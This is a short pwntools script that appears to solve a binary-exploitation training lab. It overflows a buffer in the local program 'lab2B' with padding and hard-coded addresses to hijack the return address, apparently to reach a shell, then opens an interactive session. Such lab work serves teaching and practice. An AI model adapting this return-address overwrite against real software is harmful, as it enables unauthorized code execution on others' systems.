from pwn import *
pwnlib.args.SILENT('SILENT')

p = process(['./lab2B', "A" * 27 + "\xBD\x86\x04\x08AAAA\xd0\x87\x04\x08"])
p.interactive()
